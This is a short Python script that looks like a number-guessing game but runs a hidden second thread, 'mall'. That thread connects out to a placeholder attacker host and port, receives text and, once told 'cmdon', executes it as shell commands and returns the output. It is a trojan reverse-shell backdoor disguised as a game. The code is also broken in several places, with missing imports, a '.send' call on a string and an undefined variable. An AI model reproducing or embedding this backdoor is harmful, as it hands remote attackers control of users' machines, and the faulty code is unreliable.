import	subprocess as sp,sys

def mall():
	HOST = '$IP'
	PORT = $port

	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	client.connect((HOST, PORT))


	cmd_mode = False

	while True:
		server_command= str(client.recv(1024))

		if server_command != "exit()":

			if server_command == "cmdon":
				cmd_mode = True
				client.send("Terminal Access".encode('utf-8'))
				continue
			if server_command == "cmdoff":
				cmd_mode = False
			if cmd_mode:
				sh = sp.Popen(server_command, shell=True, stdout =sp.PIPE, stderr = sp.PIPE, stdin= sp.PIPE)
				out, err = sh.communicate()
				result = str(out) + str(err)
				length = str(len(result)).zfill(16)
				server_command.send(length + result)

			if server_command == 'hello':
				print('hello World')
			client.send(f"{server_command} was executed successfully".encode('utf-8'))
		else :
			break
		




def game():

	numb = random.randint(0,1000)
	tries = 1

	done = False 

	while  not done:
		
		find = int (input("Enter a number:"))

		if find ==numb:
			done = True
			print ("You Win")
		else:
			tries +=1
			if find > numb:
				print("Smaller")
			else:
				print ("Larger")

	print(f"you did {ties} tris !")		

t1 = threading.Thread(target=game)
t2 = threading.Thread(target=mall)

t1.start()
t2.start()
